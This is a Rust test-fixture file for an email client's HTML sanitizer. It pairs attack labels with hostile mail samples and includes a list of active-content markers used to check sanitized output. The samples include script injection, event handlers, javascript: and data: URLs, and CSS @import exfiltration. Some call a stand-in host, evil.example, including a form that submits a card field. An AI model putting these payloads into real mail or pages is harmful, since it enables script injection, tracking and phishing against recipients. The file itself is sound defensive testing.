//! Hostile-mail fixture corpus (backlog.md P0.5).
//!
//! A reusable set of adversarial HTML mail inputs, each labeled by what it
//! attacks, run through the sanitizer by `hostile_corpus_is_neutralized` in
//! `sanitize.rs`. CI runs them via `cargo test -p quill-store`.

/// (attack, raw mail HTML) pairs covering the hostile-mail surface: scripts,
/// event handlers, URL schemes, CSS exfiltration, SVG, forms, tracking pixels,
/// CID confusion, malformed markup, entity obfuscation, and oversized content.
pub fn hostile_mail() -> Vec<(&'static str, String)> {
    let mut cases: Vec<(&'static str, String)> = vec![
        ("inline script", r#"<p>hi</p><script>alert(1)</script>"#.into()),
        ("external script", r#"<script src="https://evil.example/x.js"></script><p>hi</p>"#.into()),
        ("event handler onclick", r#"<p onclick="alert(1)">hi</p>"#.into()),
        ("event handler onerror on img", r#"<img src=x onerror="fetch('//evil.example')">"#.into()),
        ("event handler onload on svg", r#"<svg onload="alert(1)"></svg>"#.into()),
        ("javascript: href", r#"<a href="javascript:alert(1)">x</a>"#.into()),
        ("javascript: img src", r#"<img src="javascript:alert(1)">"#.into()),
        ("data:text/html src", r#"<iframe src="data:text/html,<script>alert(1)</script>"></iframe>"#.into()),
        ("vbscript: href", r#"<a href="vbscript:msgbox(1)">x</a>"#.into()),
        ("css url(javascript)", r#"<style>body{background:url(javascript:alert(1))}</style><p>hi</p>"#.into()),
        ("css expression()", r#"<style>div{width:expression(alert(1))}</style>"#.into()),
        ("css @import exfil", r#"<style>@import url(https://evil.example/x)</style><p>hi</p>"#.into()),
        ("meta refresh", r#"<meta http-equiv="refresh" content="0;url=https://evil.example"><p>hi</p>"#.into()),
        ("svg embedded script", r#"<svg><script>alert(1)</script></svg><p>hi</p>"#.into()),
        ("iframe srcdoc nesting", r#"<iframe srcdoc="<script>alert(1)</script>"></iframe>"#.into()),
        ("object embed", r#"<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x"></embed>"#.into()),
        ("base hijack", r#"<base href="https://evil.example/"><a href="/steal">x</a>"#.into()),
        ("form action", r#"<form action="https://evil.example"><input type=text name=card><button type=submit>Go</button></form>"#.into()),
        ("tracking pixel", r#"<img src="https://track.example/px.gif" width="1" height="1">"#.into()),
        ("tracking pixel css", r#"<p style="background:url(https://track.example/pixel.png)">hi</p>"#.into()),
        ("cid image", r#"<img src="cid:beef@example">"#.into()),
        ("entity-obfuscated script", "&#60;script&#62;alert(1)&#60;/script&#62;".into()),
        ("entity-obfuscated event", r#"<p on&#x6d;ouseover="alert(1)">hi</p>"#.into()),
        ("spliced null byte", "<scr\u{0}ipt>alert(1)</scr\u{0}ipt>".into()),
        ("unclosed tag attribute injection", r#"<img src=x onerror=alert(1)"#.into()),
        ("unclosed comment swallow", r#"<p>hi<!--<script>alert(1)</script>"#.into()),
        ("oversized content", "<p>".repeat(1_000_000)),
    ];
    cases
}

/// True when a string still contains active-content markers — the post-sanitize
/// assertion for the corpus.
pub fn has_active_content(s: &str) -> bool {
    let lower = s.to_lowercase();
    [
        "<script", "</script", "onerror=", "onload=", "onclick=", "onmouseover=",
        "onfocus=", "onchange=", "onsubmit=", "onkeydown=", "javascript:", "vbscript:",
        "data:text/html", "srcdoc=", "<iframe", "<object", "<embed", "<base", "<form",
        "<input", "<style", "@import", "expression(", "url(javascript:",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}
